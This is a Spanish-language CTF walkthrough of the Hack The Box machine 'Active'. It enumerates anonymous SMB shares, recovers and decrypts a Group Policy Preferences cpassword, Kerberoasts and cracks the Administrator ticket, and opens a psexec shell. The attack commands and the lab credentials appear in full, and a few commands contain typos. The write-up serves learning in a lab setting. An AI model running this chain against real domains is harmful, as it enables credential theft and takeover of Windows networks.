#  ACTIVE MACHINE

**Autor: Christian Jimenez**

![foto](https://raw.githubusercontent.com/kriko69/CTF-writeups/main/HTB/ACTIVE/images/1.png)


## ESCANEO Y ENUMERACION

vamos a realizar un escaneo con nmap:

```bash
nmap -p- --open -T5 -v -n 10.10.10.100 -oG allPorts
```

La salida nos muesta los sigueinets puertos:

![foto](https://raw.githubusercontent.com/kriko69/CTF-writeups/main/HTB/ACTIVE/images/2.png)

Vamos a realizar una enumeracion de los servicios en los puertos:

```bash
nmap -p -sV -sC 10.10.10.11 -oN targeted
```

este es el resultado:

![foto](https://raw.githubusercontent.com/kriko69/CTF-writeups/main/HTB/ACTIVE/images/3.png)

## EXPLOTACION

vemos que tiene el samba habilitado (445) y un indicio de que estamos frente a un active directory es que esta habilitado kerberos (88).

primero vamos a ver si podemos ver los recursos compartidos de la maquina con una autenticacion nula:

```bash
smbmap -H 10.10.10.100 -u ""
```

![foto](https://raw.githubusercontent.com/kriko69/CTF-writeups/main/HTB/ACTIVE/images/4.png)

tenemos acceso solo de lectura en **Replication**, vamos a ver que hay adentro:

```bash
smbmap -H 10.10.10.100 -u "" -r Replication
```

![foto](https://raw.githubusercontent.com/kriko69/CTF-writeups/main/HTB/ACTIVE/images/5.png)

vemos una carpeta con el nombre del dominio **active.htb**, esto lo vamos a agregar al **/etc/hosts** para futuras pruebas, veamos que hay adentro:

```bash
smbmap -H 10.10.10.100 -u "" -r Replication/active.htb
```

vemos la siguiente estructura:

![foto](https://raw.githubusercontent.com/kriko69/CTF-writeups/main/HTB/ACTIVE/images/7.png)

averiguando un poco esta estructura es la misma a la de **SYSVOL** (al parecer es su replica) 

### EXPLICACION DE LA CARPETA SYSVOL

> La carpeta SYSVOL es una carpeta compartidad que almacena la informacion de las politias de grupos junto a los scripts de inicio de sesion o podemos decir que contiene los archivos publicos de los controladores de dominio y cada usuario de dominio tiene derechos para acceder a la carpeta sysvol y su conetnido en modo solo de lectura

fuente: [https://www.windowstechno.com/what-is-sysvol-folder-in-active-directory/](https://www.windowstechno.com/what-is-sysvol-folder-in-active-directory/)

la tura por defecto es **C:\\Windows\\SYSVOL** pero puede cambiar durante la instalacion.

SYSVOL se utiliza para entregar las politicas y los scripts de inicio de sesion a los miembros del dominio. Replica todas las politicas de grupo de un dominio a otro controlador de dominio en un dominio particular y se lo hace mediante DFSR.

Comenzando con los dominios creados en Windows Server 2008, DFSR es el método de replicación de SYSVOL predeterminado. Con DFSR, solo se replica la parte modificada del archivo, aunque solo para archivos de **más de 64 KB**.

**ESTRUCTURA**

![foto](https://raw.githubusercontent.com/kriko69/CTF-writeups/main/HTB/ACTIVE/images/6.png)

**PENESTING SYSVOL FOLDER**

Uno de estos métodos es extraer SYSVOL para obtener datos de credenciales.

SYSVOL es el recurso compartido de todo el dominio en Active Directory al que todos los usuarios autenticados tienen acceso de lectura. SYSVOL contiene scripts de inicio de sesión, datos de políticas de grupo y otros datos de todo el dominio que deben estar disponibles en cualquier lugar donde haya un controlador de dominio (ya que SYSVOL se sincroniza y comparte automáticamente entre todos los controladores de dominio).

Todas las políticas de grupo de dominio se almacenan aquí: \\\<DOMAIN\>\\SYSVOL\\\<DOMAIN\>\\Policies\\

En 2006, Microsoft compró "PolicyMaker" de Desktop Standard, que renombraron y lanzaron con Windows Server 2008 como "Preferencias de políticas de grupo". Una de las características más útiles de las preferencias de directiva de grupo (GPP) es la capacidad de almacenar y usar credenciales en varios escenarios. Éstos incluyen:

-   Unidades de mapa (Drives.xml)
-   Crear usuarios locales
-   Fuentes de datos (DataSources.xml)
-   Configuración de la impresora (Printers.xml)
-   Servicios de creación / actualización (Services.xml)
-   **Tareas programadas (ScheduledTasks.xml) **
-   **Cambiar** **las** **contraseñas del administrador** **local**

Cuando se crea un nuevo GPP, se crea un archivo XML asociado en SYSVOL con los datos de configuración relevantes y, si se proporciona una contraseña, está cifrada con AES-256 bits, lo que debería ser lo suficientemente bueno...

Excepto en algún momento antes de 2012, [Microsoft publicó la clave privada AES en MSDN](https://msdn.microsoft.com/en-us/library/2c15cbf0-f086-4c74-8b70-1f2fa45dd4be.aspx) que se puede utilizar para descifrar la contraseña. Dado que los usuarios autenticados (cualquier usuario de dominio o usuarios de un dominio de confianza) tienen acceso de lectura a SYSVOL, cualquier persona del dominio puede buscar archivos XML que contengan **"cpassword"** en el recurso compartido de SYSVOL, que es el valor que contiene la contraseña cifrada AES.

una forma de buscar esto desde cmd o powershell es:

```bash
findstr /S /I cpassword \\<FQDN>\sysvol\<FQDN>\policies\*.xml
```

una vez encontrado esta cadena puede usar **gpp-decrypt** en kali.

o para automatizar todo este proceso la herrameinta Get-GPPPassword de powersploit [https://github.com/PowerShellMafia/PowerSploit/blob/master/Exfiltration/Get-GPPPassword.ps1](https://github.com/PowerShellMafia/PowerSploit/blob/master/Exfiltration/Get-GPPPassword.ps1)

**otras fuentes de internet**

- [http://www.techiebird.com/Sysvol_structure.html](http://www.techiebird.com/Sysvol_structure.html)
- [https://www.windowstechno.com/what-is-sysvol-folder-in-active-directory/](https://www.windowstechno.com/what-is-sysvol-folder-in-active-directory/)
- [https://adsecurity.org/?p=2288](https://adsecurity.org/?p=2288)
- [https://blog.netwrix.com/2017/01/30/sysvol-directory/](https://blog.netwrix.com/2017/01/30/sysvol-directory/)

## EXPLOTACION SEGUNDA PARTE

dicho esto ya sabemos que tenemos que hacer, debemos ver si encontramos en alguna parte la cadena **cpassword** y lo podremos decifrar, lo encontre en la siguiente rurta del recurso compartido:

```bash
smbmap -H 10.10.10.100 -u "" -r Replication/active.htb/Policies/{31B2F340-016D-11D2-945F-00C04FB984F9}/MACHINE/Preferences/Groups
```

![foto](https://raw.githubusercontent.com/kriko69/CTF-writeups/main/HTB/ACTIVE/images/8.png)

ese archivo **Groups.xml** lo debemos descargar en nuestra maquina local para ver su contenido:

```bash
mbmap -H 10.10.10.100 -u "" -r Replication/active.htb/Policies/{31B2F340-016D-11D2-945F-00C04FB984F9}/MACHINE/Preferences/Groups --download Replication/active.htb/Policies/{31B2F340-016D-11D2-945F-00C04FB984F9}/MACHINE/Preferences/Groups/Groups.xml
``` 

al ver el contenido vemos el **cpassword** y a quien le pertenece **userName**:

![foto](https://raw.githubusercontent.com/kriko69/CTF-writeups/main/HTB/ACTIVE/images/9.png)

lo filtramos y copiamos:

```bash
cat Groups.xml | grep -oP \"ed.*?\" | tr -d \"\" | xclip -sel clip
```

ahora con la herramienta gpp-decrypt la vamos a decifrar:

```bash
gpp-decrypt edBSHOwhZLTjt/QS9FeIcJ83mjWA98gw9guKOhJOdcqh+ZGMeXOsQbCpZ3xUjTLfCuNH8pG5aSVYdYw/NglVmQ
```

![foto](https://raw.githubusercontent.com/kriko69/CTF-writeups/main/HTB/ACTIVE/images/10.png)

ahi tenemos la contraseña en texto claro, si probamos con crackmapexec parece ser valida pero no es administrador:

![foto](https://raw.githubusercontent.com/kriko69/CTF-writeups/main/HTB/ACTIVE/images/11.png)

## ELEVACION DE PRIVILEGIOS

muy bien, tenemos unas credenciales validas y el kerberos abierto, algo que podemos probar el el kerberoasting ya que tenemos credenciales validas y un asreproast ya que podriamos listar usuarios.

vamos a probar el primero kerberoasting, para ello usaremos el script de impacket **GetUserSPNs.py**:

```bash
python3 GetUserSPNs.py active.htb/SVC_TGS:GPPstillStandingStrong2k18
```

![foto](https://raw.githubusercontent.com/kriko69/CTF-writeups/main/HTB/ACTIVE/images/12.png)

parece que el usuario vulnerable es el administrador, esto quiere decir que podriamos obtener su contraseña y directamente escalar privilegios, obtengamos su ticket:

```bash
python3 GetUserSPNs.py active.htb/SVC_TGS:GPPstillStandingStrong2k18 -request 
```

puede que les salga este error:

![foto](https://raw.githubusercontent.com/kriko69/CTF-writeups/main/HTB/ACTIVE/images/13.png)

esto se debe a que la hora de la maquina no esta sincronizada con la de nuestro host kali, para solucionarlo ejecutamos lo siguiente:

```bash
sudo apt install ntpdate

ntpdate 10.10.10.100
```

fuente: [https://book.hacktricks.xyz/windows/active-directory-methodology/kerberoast](https://book.hacktricks.xyz/windows/active-directory-methodology/kerberoast)

ahora si pedimos el ticket nos mostrara:

![foto](https://raw.githubusercontent.com/kriko69/CTF-writeups/main/HTB/ACTIVE/images/14.png)

guardamos el ticket en un archivo y lo intentamos crackear con john:

```bash
john --wordlist=/usr/share/wordlists/rockyou.txt hash
```

![foto](https://raw.githubusercontent.com/kriko69/CTF-writeups/main/HTB/ACTIVE/images/15.png)

vamos a controbar si estas credenciales son del usuario  administrador con crackmapexec:

![foto](https://raw.githubusercontent.com/kriko69/CTF-writeups/main/HTB/ACTIVE/images/16.png)

nos sale un **pwned!** y eso quiere decir que somos administradores del equipo, por lo que podemos establecer una conexion remota con **psexec.py**

```bash
psexec.py active.htb/Administrator:Ticketmaster1968@10.10.10.100 cmd.exe
```

![foto](https://raw.githubusercontent.com/kriko69/CTF-writeups/main/HTB/ACTIVE/images/17.png)

y podemos ver las 2 flags:

![foto](https://raw.githubusercontent.com/kriko69/CTF-writeups/main/HTB/ACTIVE/images/18.png)